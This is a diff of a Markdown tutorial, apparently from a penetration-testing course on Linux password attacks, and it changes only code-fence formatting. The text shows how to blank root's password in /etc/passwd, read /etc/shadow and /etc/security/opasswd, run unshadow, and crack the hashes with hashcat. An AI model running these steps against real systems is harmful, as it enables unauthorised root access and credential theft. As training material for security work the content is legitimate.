@@ -25,19 +25,19 @@
 
 #### Editing /etc/passwd - Before
 
-```shell-session
+``` shell-session
 root:x:0:0:root:/root:/bin/bash
 ```
 
 #### Editing /etc/passwd - After
 
-```shell-session
+``` shell-session
 root::0:0:root:/root:/bin/bash
 ```
 
 #### Root without Password
 
-```shell-session
+``` shell-session
 [cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd
 
 root::0:0:root:/root:/bin/bash
@@ -54,7 +54,7 @@ root::0:0:root:/root:/bin/bash
 
 #### Shadow File
 
-```shell-session
+``` shell-session
 [cry0l1t3@parrot]─[~]$ sudo cat /etc/shadow
 
 root:*:18747:0:99999:7:::
@@ -69,7 +69,7 @@ cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
 
 #### Reading /etc/security/opasswd
 
-```shell-session
+``` shell-session
 [!bash!]$ sudo cat /etc/security/opasswd
 
 cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
@@ -79,7 +79,7 @@ cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgz
 
 #### Unshadow
 
-```shell-session
+``` shell-session
 [!bash!]$ sudo cp /etc/passwd /tmp/passwd.bak 
 [!bash!]$ sudo cp /etc/shadow /tmp/shadow.bak 
 [!bash!]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
@@ -87,20 +87,20 @@ cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgz
 
 #### Hashcat - Cracking Unshadowed Hashes
 
-```shell-session
+``` shell-session
 [!bash!]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
 ```
 
 #### Hashcat - Cracking MD5 Hashes
 
-```shell-session
+``` shell-session
 [!bash!]$ cat md5-hashes.list
 
 qNDkF0zJ3v8ylCOrKB0kt0
 E9uMSmiQeRh4pAAgzuvkq1
 ```
 
-```shell-session
+``` shell-session
 [!bash!]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
 ```
 
